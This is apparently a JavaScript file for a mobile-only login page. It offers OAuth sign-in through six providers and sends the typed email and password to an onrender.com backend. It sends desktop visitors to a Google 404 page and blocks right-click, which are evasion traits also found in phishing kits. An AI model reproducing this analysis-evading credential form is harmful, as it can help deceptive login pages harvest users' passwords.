if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
    window.location.href = "https://www.google.com/404";
}

document.oncontextmenu = () => false;
window.onload = () => {
    const initialHeight = window.innerHeight;
    document.body.style.height = initialHeight + 'px';
    document.body.style.overflow = 'hidden'; 
    document.documentElement.style.overflow = 'hidden';

    const loading = document.getElementById('loading-page');
    const main = document.getElementById('main-page');
    
    setTimeout(() => {
        if (loading) loading.style.opacity = '0';
        setTimeout(() => {
            if (loading) loading.style.display = 'none';
            if (main) main.classList.add('active'); 
        }, 100); 
    }, 0);

    const footer = document.querySelector('.footer-contact');
    const inputs = document.querySelectorAll('input');

    inputs.forEach(input => {
        input.addEventListener('focus', () => {
            if (footer) footer.style.opacity = '0'; 
            window.scrollTo(0, 0);
        });

        input.addEventListener('blur', () => {
            if (footer) footer.style.opacity = '1';
        });
    });
    
    const toggleBtn = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');
    if (toggleBtn && passwordInput) {
        toggleBtn.onclick = () => {
            const isPass = passwordInput.type === 'password';
            passwordInput.type = isPass ? 'text' : 'password';
            toggleBtn.classList.toggle('active');
        };
    }
};
const id = '778254561339-e8if7rcjiaoepb09b0ef8ietql29a2pa.apps.googleusercontent.com';
const app_id = '1003964725619886';
const client_id_github = 'Ov23lijBov1QHujGticS';
const key_tiktok = 'awphc9efsebgb3qe';
const client_id_discord = '1502643313352900748';
const client_id_wechat = 'b8irhkf8oi282yoz60mrlhu3o0nih7';

function googleLogin() {
  const uri = window.location.origin;
  const url = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${id}&redirect_uri=${uri}&response_type=token&scope=email profile`;
    window.location.href = url;
}

function facebookLogin() {
    const isLocal = window.location.hostname === 'localhost';
    const redirect = isLocal ? 'http://localhost:8158/login.html' : 'https://yosora62-yoho.github.io/';
    window.location.href = `https://www.facebook.com/v19.0/dialog/oauth?client_id=${app_id}&redirect_uri=${redirect}&response_type=token&scope=public_profile,email`;
}
function githubLogin() {
    const redirect_uri = window.location.origin; 
    window.location.href = `https://github.com/login/oauth/authorize?client_id=${client_id_github}&redirect_uri=${redirect_uri}&scope=user:email`;
}
function tiktokLogin() {
    const isLocal = window.location.hostname === 'localhost';
    const redirect = isLocal ? 'http://localhost:8158/login.html' : 'https://yosora62-yoho.github.io/';
    window.location.href = `https://www.tiktok.com/v2/auth/authorize/?client_key=${key_tiktok}&scope=user.info.basic&redirect_uri=${encodeURIComponent(redirect)}`;
}
function discordLogin() {
    const redirect = encodeURIComponent(window.location.origin);
    const url = `https://discord.com/api/oauth2/authorize?client_id=${client_id_discord}&redirect_uri=${redirect}&response_type=token&scope=identify email`;
    window.location.href = url;
}
function wechatLogin() {
    const redirect = encodeURIComponent(window.location.origin);
    window.location.href = `https://open.weixin.qq.com/connect/qrconnect?appid=${client_id_wechat}&redirect_uri=${redirect}&response_type=code&scope=snsapi_login`;
}
function showNotify(text) {
    const container = document.getElementById('notify-container');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = 'notify-box'; 
    toast.innerText = text;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = '0.5s ease';
        setTimeout(() => toast.remove(), 500);
    }, 3000);
}
const notifyStyle = document.createElement('style');
notifyStyle.innerHTML = `
    @keyframes slideInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes slideOutUp { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-40px); } }
`;
document.head.appendChild(notifyStyle);
async function checkLogin() {
    const emailInput = document.querySelector('input[type="email"]');
    const passInput = document.getElementById('password');
    if (!emailInput || !passInput) return;

    const email = emailInput.value.trim();
    const pass = passInput.value;
    
    if (!email || !pass) return showNotify("Please enter both email and password");
    
    if (!email) { 
        showNotify("Please enter your email"); 
        return; 
    }
    
    if (!pass) { 
        showNotify("Please enter your password"); 
        return; 
    }
    
    if (!email.includes("@")) {
        showNotify("Invalid email format. Please check again");
        return;
    }

    const dangerChars = /[&$~`÷×\\}{=%©®™✓[\]<>\/!?]/;
    if (dangerChars.test(email)) {
        showNotify("Suspicious email. Please try another one");
        return;
    }

    const sendAuth = async (lat = null, lon = null) => {
        try {
            const API_ORIGIN = window.location.hostname === 'localhost' ? 'http://localhost:3000' : 'https://zero-in-backend.onrender.com';
            const response = await fetch(`${API_ORIGIN}/api/auth/verify`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ u_data: email, a_key: pass, lat, lon })
            });
            const result = await response.json();
            showNotify(result.msg);
            if (result.status === 1 && typeof enableMasterMode === "function") enableMasterMode();
        } catch (err) {
            showNotify("Security system connection failed");
        }
    };
    if (email === 'yosora.dev@outlook.com' && navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (p) => sendAuth(p.coords.latitude, p.coords.longitude),
            () => { 
                showNotify("Location access denied."); 
                sendAuth(); 
            }
        );
    } else {
        sendAuth();
    }
}